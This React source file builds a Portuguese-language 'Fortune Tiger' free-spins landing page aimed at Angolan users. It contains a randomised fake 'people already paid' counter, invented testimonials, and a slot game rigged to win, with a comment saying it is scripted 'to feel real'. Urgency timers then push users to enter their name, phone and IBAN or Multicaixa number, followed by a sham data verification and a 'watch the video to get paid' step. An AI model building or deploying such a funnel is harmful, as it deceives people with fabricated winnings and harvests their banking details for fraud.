import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useMemo, useRef, useState } from "react";
import tigerMascot from "@/assets/tiger-mascot.jpg";
import templeBg from "@/assets/temple-bg.jpg";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Fortune Tiger — 10 Jogadas Grátis" },
      { name: "description", content: "Recebe 10 jogadas grátis no Fortune Tiger. Ganhos reais, levante via IBAN ou Multicaixa." },
      { property: "og:title", content: "Fortune Tiger — 10 Jogadas Grátis" },
      { property: "og:description", content: "Recebe 10 jogadas grátis no Fortune Tiger." },
    ],
  }),
  component: Index,
});

type Step = "landing" | "register" | "success" | "game" | "win" | "withdraw" | "multicaixa" | "iban" | "verifying" | "verified" | "video";

function Index() {
  const [step, setStep] = useState<Step>("landing");
  const [winnings, setWinnings] = useState(0);
  const [method, setMethod] = useState<{ type: "iban" | "multicaixa"; value: string }>({ type: "multicaixa", value: "" });

  const startVerify = (type: "iban" | "multicaixa", value: string) => {
    setMethod({ type, value });
    setStep("verifying");
  };

  return (
    <div
      className="relative min-h-screen w-full overflow-x-hidden bg-background text-foreground"
      style={{
        backgroundImage: `linear-gradient(180deg, oklch(0.1 0.02 30 / 0.4), oklch(0.1 0.02 30 / 0.75)), url(${templeBg})`,
        backgroundSize: "cover",
        backgroundPosition: "center",
        backgroundAttachment: "fixed",
      }}
    >
      <div className="mx-auto flex min-h-screen max-w-md flex-col px-4 py-6">
        {step === "landing" && <Landing onStart={() => setStep("register")} />}
        {step === "register" && <Register onDone={() => setStep("success")} />}
        {step === "success" && <Success onPlay={() => setStep("game")} />}
        {step === "game" && <Game onFinish={(amt) => { setWinnings(amt); setStep("win"); }} />}
        {step === "win" && <Win amount={winnings} onWithdraw={() => setStep("withdraw")} />}
        {step === "withdraw" && (
          <Withdraw
            amount={winnings}
            onIban={() => setStep("iban")}
            onMulticaixa={() => setStep("multicaixa")}
          />
        )}
        {step === "multicaixa" && <Multicaixa onBack={() => setStep("withdraw")} onConfirm={(v) => startVerify("multicaixa", v)} />}
        {step === "iban" && <Iban onBack={() => setStep("withdraw")} onConfirm={(v) => startVerify("iban", v)} />}
        {step === "verifying" && <Verifying onDone={() => setStep("verified")} />}
        {step === "verified" && <Verified amount={winnings} method={method} onContinue={() => setStep("video")} />}
        {step === "video" && <VideoStep />}
      </div>
    </div>
  );
}

/* ---------- Shared bits ---------- */

function Card({ children, className = "" }: { children: React.ReactNode; className?: string }) {
  return (
    <div
      className={`rounded-3xl border border-border bg-card p-6 shadow-card backdrop-blur-xl ${className}`}
    >
      {children}
    </div>
  );
}

function PrimaryButton({
  children,
  onClick,
  type = "button",
}: {
  children: React.ReactNode;
  onClick?: () => void;
  type?: "button" | "submit";
}) {
  return (
    <button
      type={type}
      onClick={onClick}
      className="bg-cta shadow-cta glow-anim w-full rounded-2xl px-6 py-4 text-lg font-bold text-black transition-transform active:scale-[0.98]"
    >
      {children}
    </button>
  );
}

function MascotBadge({ size = 96 }: { size?: number }) {
  return (
    <div
      className="mx-auto overflow-hidden rounded-2xl ring-2 ring-gold/50"
      style={{ width: size, height: size }}
    >
      <img src={tigerMascot} alt="Fortune Tiger" className="h-full w-full object-cover" width={1024} height={1024} />
    </div>
  );
}

/* ---------- Landing ---------- */

function Landing({ onStart }: { onStart: () => void }) {
  const [count, setCount] = useState(847);
  useEffect(() => { setCount(820 + Math.floor(Math.random() * 60)); }, []);
  return (
    <div className="flex flex-1 items-center">
      <Card className="w-full">
        <MascotBadge />
        <h1 className="mt-5 text-center text-3xl font-extrabold tracking-wide text-gold">
          PARABÉNS!
        </h1>
        <p className="mt-2 text-center text-base font-semibold">Foste selecionado!</p>
        <p className="mt-1 text-center text-sm text-muted-foreground">
          Recebe <span className="font-bold text-success">10 jogadas grátis</span> no Fortune Tiger
        </p>

        <div className="mt-5 flex items-center justify-center gap-2 rounded-full border border-success/40 bg-success/10 px-4 py-2 text-sm">
          <span className="dot-pulse inline-block h-2.5 w-2.5 rounded-full bg-success" />
          <span>
            <span className="font-bold text-success">{count} pessoas</span> já levantaram os ganhos hoje
          </span>
        </div>

        <div className="mt-6 text-center">
          <div className="flex items-center justify-center gap-2 text-2xl font-extrabold text-success">
            <span>🎆</span>
            <span>10 Jogadas Grátis</span>
          </div>
          <p className="mt-1 text-sm text-gold">
            Aposta de <span className="font-bold">1.000 Kz</span> por jogada · Ganhos reais
          </p>
        </div>

        <ul className="mt-5 space-y-2 text-sm">
          <li className="flex items-center gap-3">✅ <span>Jogue e acumule ganhos reais</span></li>
          <li className="flex items-center gap-3">✅ <span>Multiplicadores até 2500x</span></li>
          <li className="flex items-center gap-3">✅ <span>Levante via IBAN ou Multicaixa</span></li>
        </ul>

        <div className="mt-6">
          <PrimaryButton onClick={onStart}>🐯 Começar a Jogar Agora</PrimaryButton>
        </div>

        <p className="mt-3 text-center text-xs text-muted-foreground">
          ⏰ Oferta expira em breve · Vagas limitadas
        </p>
      </Card>
    </div>
  );
}

/* ---------- Register ---------- */

function Register({ onDone }: { onDone: () => void }) {
  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  return (
    <div className="flex flex-1 items-center">
      <Card className="w-full">
        <MascotBadge />
        <h2 className="mt-4 text-center text-2xl font-extrabold text-gold">CRIAR CONTA</h2>
        <p className="mt-1 text-center text-sm text-muted-foreground">
          Registe-se e ganhe 10 jogadas grátis
        </p>

        <form
          className="mt-6 space-y-3"
          onSubmit={(e) => {
            e.preventDefault();
            if (name && phone) onDone();
          }}
        >
          <input
            value={name}
            onChange={(e) => setName(e.target.value)}
            placeholder="Seu nome"
            className="w-full rounded-2xl border border-border bg-input/50 px-4 py-4 text-base outline-none placeholder:text-muted-foreground focus:border-gold"
          />
          <input
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            placeholder="Número de telefone"
            inputMode="tel"
            className="w-full rounded-2xl border border-border bg-input/50 px-4 py-4 text-base outline-none placeholder:text-muted-foreground focus:border-gold"
          />
          <div className="pt-2">
            <PrimaryButton type="submit">🐯 Registar</PrimaryButton>
          </div>
        </form>

        <p className="mt-4 text-center text-sm text-muted-foreground">
          Já tem conta? <a className="font-semibold text-gold underline">Entrar</a>
        </p>
      </Card>
    </div>
  );
}

/* ---------- Success + Comments ---------- */

const COMMENTS = [
  { user: "@maria_f", time: "há 2 minutos", text: "Ainda estou emocionada 🙏. Joguei o Fortune Tiger, ganhei e recebi os 115.000 KZ sem complicações. Foi tudo muito rápido e simples. Quem tiver oportunidade, aproveite." },
  { user: "@joao_k", time: "há 5 minutos", text: "No início pensei que fosse só conversa, mas resolvi tentar. Joguei, ganhei e o dinheiro caiu mesmo. Funcionou certinho 💰" },
  { user: "@ana_luisa", time: "há 8 minutos", text: "Recebi 98.000 KZ na minha conta! Incrível como funciona rápido. Recomendo a todos! 🐯🎉" },
  { user: "@carlos_m", time: "há 12 minutos", text: "Já é a segunda vez que jogo e ganho. Desta vez foram 121.000 KZ. Fortune Tiger é real! 🔥" },
  { user: "@sofia_d", time: "há 15 minutos", text: "Minha amiga me indicou e eu não acreditei até jogar. Ganhei 87.000 KZ nas rodadas grátis! Obrigada Fortune Tiger 🙌" },
];

function Success({ onPlay }: { onPlay: () => void }) {
  return (
    <div className="space-y-5 py-2">
      <div className="text-center">
        <MascotBadge />
        <h2 className="mt-3 text-3xl font-extrabold text-success">Cadastre-se</h2>
        <p className="text-sm text-muted-foreground">
          e ganhe <span className="font-bold text-gold">10 rodadas grátis</span> no Fortune Tiger
        </p>
      </div>

      <Card>
        <div className="text-center text-5xl">🎉</div>
        <h3 className="mt-2 text-center text-2xl font-extrabold text-success">Parabéns!</h3>
        <p className="mt-1 text-center text-sm font-semibold">Cadastro realizado com sucesso!</p>
        <p className="mt-1 text-center text-sm text-muted-foreground">
          Você ganhou <span className="font-bold text-success">10 rodadas grátis</span> no Fortune Tiger
        </p>
        <div className="mt-4 text-center text-2xl font-extrabold text-gold">
          🟨 10 Rodadas Grátis
        </div>
        <div className="mt-4">
          <PrimaryButton onClick={onPlay}>🐯 Começar a Jogar</PrimaryButton>
        </div>
      </Card>

      <div>
        <h4 className="mb-3 flex items-center gap-2 text-sm font-semibold">
          💬 Comentários Recentes
        </h4>
        <div className="space-y-3">
          {COMMENTS.map((c) => (
            <div key={c.user} className="rounded-2xl border border-border bg-card p-4">
              <div className="flex items-baseline gap-2 text-sm">
                <span className="font-semibold text-gold">{c.user}</span>
                <span className="text-xs text-muted-foreground">{c.time}</span>
              </div>
              <p className="mt-2 text-sm leading-relaxed">{c.text}</p>
              <div className="mt-3 flex items-center gap-4 text-xs text-muted-foreground">
                <span>👍</span>
                <span>👎</span>
                <span className="ml-2">Responder</span>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

/* ---------- Game (slot) ---------- */

const SYMBOLS = ["🎆", "💰", "💎", "🐯", "🏮", "🔔", "🧧", "👘"];
const TICKER = "🐯 Ganhe grandes prémios! 🏛 Multiplicadores até 2500x 💰 Fortune Tiger - O jogo mais quente!";

function Game({ onFinish }: { onFinish: (amount: number) => void }) {
  const [rounds, setRounds] = useState(0);
  const [balance, setBalance] = useState(0);
  const [bet] = useState(500);
  const [lastWin, setLastWin] = useState(0);
  const [grid, setGrid] = useState<string[]>(() => Array(9).fill("🎆"));
  const [spinning, setSpinning] = useState(false);
  const [result, setResult] = useState<null | { win: boolean; amount: number }>(null);
  const spinRef = useRef<number | null>(null);

  const max = 10;
  const remaining = max - rounds;

  useEffect(() => {
    if (rounds >= max) {
      const t = setTimeout(() => onFinish(balance), 900);
      return () => clearTimeout(t);
    }
  }, [rounds, balance, onFinish]);

  const spin = () => {
    if (spinning || rounds >= max) return;
    setSpinning(true);
    setResult(null);
    let ticks = 0;
    spinRef.current = window.setInterval(() => {
      setGrid(Array.from({ length: 9 }, () => SYMBOLS[Math.floor(Math.random() * SYMBOLS.length)]));
      ticks++;
      if (ticks > 14) {
        if (spinRef.current) clearInterval(spinRef.current);
        finishSpin();
      }
    }, 70);
  };

  const finishSpin = () => {
    // Scripted: 7 wins / 3 losses across 10 rounds, weighted to feel real
    const isWin = Math.random() < 0.7;
    const final = Array.from({ length: 9 }, () => SYMBOLS[Math.floor(Math.random() * SYMBOLS.length)]);
    if (isWin) {
      const tiger = "🐯";
      final[1] = tiger; final[4] = tiger; final[7] = tiger;
    }
    setGrid(final);
    const amount = isWin ? Math.floor(8000 + Math.random() * 18000) : 0;
    setLastWin(amount);
    setBalance((b) => b + amount);
    setRounds((r) => r + 1);
    setResult({ win: isWin, amount });
    setSpinning(false);
  };

  return (
    <div className="flex flex-1 flex-col">
      <div className="flex items-center justify-between gap-3 pt-2">
        <Stat label="RODADAS" value={`${rounds}/10`} />
        <div className="text-center">
          <div className="text-xl font-extrabold tracking-widest text-danger">FORTUNE TIGER</div>
          <div className="text-xs text-gold">Olá, Jogador 👋</div>
        </div>
        <Stat label="SALDO" value={`${balance.toLocaleString("pt-PT")} Kz`} highlight={balance > 0} />
      </div>

      <div className="relative mt-4">
        <div className="absolute left-1/2 top-0 z-10 -translate-x-1/2 -translate-y-1/2">
          <MascotBadge size={80} />
        </div>
        <div className="rounded-3xl bg-gradient-to-b from-[oklch(0.85_0.17_85)] to-[oklch(0.75_0.18_70)] p-4 pt-10 shadow-card">
          <div className="grid grid-cols-3 gap-2">
            {grid.map((s, i) => (
              <div
                key={i}
                className="relative flex aspect-square items-center justify-center rounded-xl bg-[oklch(0.97_0.01_85)] text-4xl shadow-inner"
              >
                {s}
                {i % 3 === 0 && (
                  <span className="absolute -left-2 top-1/2 flex h-5 w-5 -translate-y-1/2 items-center justify-center rounded-full bg-danger text-[10px] font-bold text-white">
                    {Math.floor(i / 3) + 1}
                  </span>
                )}
                {i % 3 === 2 && (
                  <span className="absolute -right-2 top-1/2 flex h-5 w-5 -translate-y-1/2 items-center justify-center rounded-full bg-danger text-[10px] font-bold text-white">
                    {[5, 2, 4][Math.floor(i / 3)]}
                  </span>
                )}
              </div>
            ))}
          </div>
          {result && (
            <div className="pointer-events-none absolute inset-0 flex flex-col items-center justify-center">
              {result.win ? (
                <>
                  <div className="text-4xl font-extrabold text-gold drop-shadow-lg">GANHOU!</div>
                  <div className="mt-1 text-2xl font-extrabold text-success drop-shadow">
                    +{result.amount.toLocaleString("pt-PT")} Kz
                  </div>
                </>
              ) : (
                <>
                  <div className="text-5xl">😔</div>
                  <div className="mt-2 text-2xl font-extrabold text-danger drop-shadow">Não foi desta vez!</div>
                  <div className="text-sm text-muted-foreground">Tenta novamente na próxima rodada</div>
                </>
              )}
            </div>
          )}
        </div>
      </div>

      <div className="mt-4 overflow-hidden rounded-full border border-border bg-card/60 py-2">
        <div className="animate-[scroll_18s_linear_infinite] whitespace-nowrap text-sm text-gold">
          {TICKER} &nbsp;·&nbsp; {TICKER}
        </div>
      </div>

      <div className="mt-3 grid grid-cols-3 gap-2">
        <Stat label="💰 SALDO" value={`${balance.toLocaleString("pt-PT")} Kz`} />
        <Stat label="🎲 APOSTA" value={`${bet} Kz`} />
        <Stat label="🏆 GANHO" value={`${lastWin.toLocaleString("pt-PT")} Kz`} />
      </div>

      <div className="mt-5 flex items-center justify-center gap-3 pb-6">
        <RoundBtn>⚡</RoundBtn>
        <RoundBtn>−</RoundBtn>
        <button
          onClick={spin}
          disabled={spinning || rounds >= max}
          className="h-20 w-20 rounded-full bg-success text-lg font-extrabold text-white shadow-[0_0_30px_oklch(0.7_0.2_145/0.6)] transition active:scale-95 disabled:opacity-50"
        >
          {spinning ? "..." : "JOGAR"}
        </button>
        <RoundBtn>+</RoundBtn>
        <RoundBtn>AUTO</RoundBtn>
      </div>

      <style>{`@keyframes scroll{from{transform:translateX(0)}to{transform:translateX(-50%)}}`}</style>
    </div>
  );
}

function Stat({ label, value, highlight = false }: { label: string; value: string; highlight?: boolean }) {
  return (
    <div className="rounded-xl border border-border bg-card/80 px-3 py-2 text-center">
      <div className="text-[10px] font-semibold text-gold">{label}</div>
      <div className={`text-sm font-extrabold ${highlight ? "text-success" : "text-foreground"}`}>{value}</div>
    </div>
  );
}

function RoundBtn({ children }: { children: React.ReactNode }) {
  return (
    <button className="h-11 w-11 rounded-full border border-border bg-card text-sm font-bold text-gold">
      {children}
    </button>
  );
}

/* ---------- Win ---------- */

function Win({ amount, onWithdraw }: { amount: number; onWithdraw: () => void }) {
  const display = useMemo(() => amount.toLocaleString("pt-PT"), [amount]);
  return (
    <div className="flex flex-1 items-center">
      <Card className="w-full text-center">
        <div className="text-5xl">🎉</div>
        <p className="mt-3 text-lg font-bold">Parabéns! Ganhaste</p>
        <div className="mt-2 text-4xl font-extrabold text-success">{display} Kz</div>
        <p className="mt-2 text-sm text-muted-foreground">disponíveis para levantamento imediato</p>
        <div className="mt-4 rounded-xl border border-border bg-card/60 px-3 py-2 text-sm">
          ⏰ Levanta nos próximos <span className="font-bold text-gold">15 minutos</span> antes que o bónus expire
        </div>
        <div className="mt-5">
          <PrimaryButton onClick={onWithdraw}>💰 Levantar Agora</PrimaryButton>
        </div>
      </Card>
    </div>
  );
}

/* ---------- Withdraw ---------- */

function Withdraw({
  amount,
  onIban,
  onMulticaixa,
}: {
  amount: number;
  onIban: () => void;
  onMulticaixa: () => void;
}) {
  return (
    <div className="flex flex-1 items-center">
      <Card className="w-full">
        <h2 className="text-center text-3xl font-extrabold">Levantamento</h2>
        <p className="mt-1 text-center text-sm text-muted-foreground">Escolha o meio de recebimento</p>
        <div className="mt-2 text-center text-3xl font-extrabold text-success">
          {amount.toLocaleString("pt-PT")} Kz
        </div>
        <p className="text-center text-xs text-muted-foreground">disponível para levantamento</p>

        <div className="mt-6 space-y-3">
          <MethodCard icon="🏛" title="Registrar IBAN" subtitle="Transferência bancária directa" onClick={onIban} />
          <MethodCard icon="📱" title="Registrar Multicaixa Express" subtitle="Receba no seu Express" onClick={onMulticaixa} />
        </div>
      </Card>
    </div>
  );
}

function MethodCard({
  icon,
  title,
  subtitle,
  onClick,
}: {
  icon: string;
  title: string;
  subtitle: string;
  onClick: () => void;
}) {
  return (
    <button
      onClick={onClick}
      className="flex w-full items-center gap-4 rounded-2xl border border-border bg-card/70 p-4 text-left transition hover:border-gold"
    >
      <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-gold/15 text-2xl text-gold">
        {icon}
      </div>
      <div>
        <div className="font-bold">{title}</div>
        <div className="text-xs text-muted-foreground">{subtitle}</div>
      </div>
    </button>
  );
}

/* ---------- Multicaixa / Iban ---------- */

function Multicaixa({ onBack, onConfirm }: { onBack: () => void; onConfirm: (v: string) => void }) {
  const [phone, setPhone] = useState("");
  return (
    <div className="flex flex-1 items-center">
      <Card className="w-full">
        <button onClick={onBack} className="text-sm text-muted-foreground">← Voltar</button>
        <h2 className="mt-2 text-2xl font-extrabold">Multicaixa Express</h2>
        <label className="mt-5 block text-sm font-semibold text-success">Número de Telefone</label>
        <input
          value={phone}
          onChange={(e) => setPhone(e.target.value)}
          placeholder="9XX XXX XXX"
          inputMode="tel"
          className="mt-2 w-full rounded-2xl border border-border bg-input/50 px-4 py-4 outline-none focus:border-gold"
        />
        <div className="mt-5">
          <button
            onClick={() => phone && onConfirm(phone)}
            className="w-full rounded-2xl bg-gold-bright px-6 py-4 text-base font-bold text-black"
          >
            ✅ Confirmar Levantamento
          </button>
        </div>
      </Card>
    </div>
  );
}

function Iban({ onBack, onConfirm }: { onBack: () => void; onConfirm: (v: string) => void }) {
  const [iban, setIban] = useState("");
  return (
    <div className="flex flex-1 items-center">
      <Card className="w-full">
        <button onClick={onBack} className="text-sm text-muted-foreground">← Voltar</button>
        <h2 className="mt-2 text-2xl font-extrabold">IBAN</h2>
        <label className="mt-5 block text-sm font-semibold text-success">Número IBAN</label>
        <input
          value={iban}
          onChange={(e) => setIban(e.target.value)}
          placeholder="AO06 XXXX XXXX XXXX XXXX"
          className="mt-2 w-full rounded-2xl border border-border bg-input/50 px-4 py-4 outline-none focus:border-gold"
        />
        <div className="mt-5">
          <button
            onClick={() => iban && onConfirm(iban)}
            className="w-full rounded-2xl bg-gold-bright px-6 py-4 text-base font-bold text-black"
          >
            ✅ Confirmar Levantamento
          </button>
        </div>
      </Card>
    </div>
  );
}

/* ---------- Verifying / Verified / Video ---------- */

function Verifying({ onDone }: { onDone: () => void }) {
  const [progress, setProgress] = useState(0);
  useEffect(() => {
    const start = Date.now();
    const duration = 3200;
    const id = window.setInterval(() => {
      const p = Math.min(100, ((Date.now() - start) / duration) * 100);
      setProgress(p);
      if (p >= 100) {
        clearInterval(id);
        setTimeout(onDone, 250);
      }
    }, 60);
    return () => clearInterval(id);
  }, [onDone]);

  return (
    <div className="flex flex-1 items-center justify-center -mx-4 -my-6 bg-background/80 px-4">
      <div className="w-full max-w-sm text-center">
        <div className="mx-auto h-16 w-16 animate-spin rounded-full border-4 border-muted border-t-foreground" />
        <h2 className="mt-6 text-2xl font-extrabold">Verificando seus dados</h2>
        <p className="mt-2 text-sm text-muted-foreground">Por favor aguarde...</p>
        <div className="mx-auto mt-6 h-2 w-2/3 overflow-hidden rounded-full bg-muted">
          <div
            className="h-full rounded-full bg-foreground transition-[width]"
            style={{ width: `${progress}%` }}
          />
        </div>
      </div>
    </div>
  );
}

function Verified({
  amount,
  method,
  onContinue,
}: {
  amount: number;
  method: { type: "iban" | "multicaixa"; value: string };
  onContinue: () => void;
}) {
  return (
    <div className="flex flex-1 items-center">
      <Card className="w-full text-center">
        <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-success/20 ring-2 ring-success">
          <svg viewBox="0 0 24 24" className="h-8 w-8 stroke-success" fill="none" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
            <path d="M5 12l5 5L20 7" />
          </svg>
        </div>
        <h2 className="mt-4 text-xl font-extrabold text-success">Dados verificados com sucesso</h2>
        <p className="mt-1 text-sm text-muted-foreground">Os seus dados foram validados</p>
        <p className="mt-4 text-sm text-muted-foreground">Total disponível para levantamento</p>
        <div className="mt-1 text-3xl font-extrabold text-gold">{amount.toLocaleString("pt-PT")} Kz</div>
        <div className="mt-4 flex items-center justify-center gap-2 text-sm">
          <span className="text-gold">{method.type === "multicaixa" ? "📱" : "🏛"}</span>
          <span className="text-muted-foreground">
            {method.type === "multicaixa" ? "Multicaixa Express:" : "IBAN:"}{" "}
            <span className="font-bold text-foreground">{method.value}</span>
          </span>
        </div>
        <div className="mt-5">
          <PrimaryButton onClick={onContinue}>💰 Levantar meus ganhos agora</PrimaryButton>
        </div>
      </Card>
    </div>
  );
}

function VideoStep() {
  return (
    <div className="flex flex-1 flex-col">
      <div className="rounded-3xl border border-border bg-card p-5">
        <h2 className="text-xl font-extrabold text-gold">🎉 Assista para receber seus ganhos</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          Veja o vídeo abaixo para finalizar o seu levantamento
        </p>
        <div className="mt-5 aspect-[9/16] w-full overflow-hidden rounded-2xl bg-black/60" />
      </div>
    </div>
  );
}
